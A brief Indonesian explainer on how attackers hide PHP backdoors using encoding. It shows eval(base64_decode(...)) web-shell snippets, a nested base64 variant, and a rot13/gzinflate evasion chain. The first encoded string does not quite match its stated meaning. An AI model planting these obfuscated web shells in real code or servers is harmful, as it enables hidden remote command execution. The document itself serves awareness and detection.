# Careful hidden backdoor with Encoding

Encoding adalah sebuah cara untuk merubah sebuah string menjadi string acak dengan algoritma tertentu, tujuan untuk membuat komputer lebih mudah mengenali ataupun untuk menjaga konsistensi perpindahan data. Encoding biasanya susah untuk dibaca ataupun dipahami dikarenakan bentuknya acak sekali. Hal ini yang dimanfaatkan para hacker untuk menyembunyikan sebuah backdoor. Seperti berikut ini contohnya.



# Simple base64 backdoor

```php
<?php 
    
    $data = "ZWNobyBzeXN0ZW0oWzBdKTs="; //echo system($_GET[0]);
	eval(base64_decode($data));
```

atau 

```php
<?php eval(base64_decode("ZWNobyBzeXN0ZW0oWzBdKTs")) ?>
```



Biasanya stringnya sangat panjang sekali, dan selalu dieksekusi oleh `eval`



# Nested base64 

```php 
<?php 
   	eval(base64_decode(base64_decode(base64_decode("V2xkT2IySjVRbnBsV0U0d1dsY3diMWQ2UW1STFZITTlDZz09Cg=="))));
```

Nested base64 biasanya untuk mengelabuhi seorang `Junior Developer` yang mana biasanya akan mengabaikan sebuah syntax yang dia tidak pahami.



# Nested Encoding and Evasion



```php
<?php
eval(str_rot13(gzinflate(str_rot13(base64_decode('string')))));
?>
```



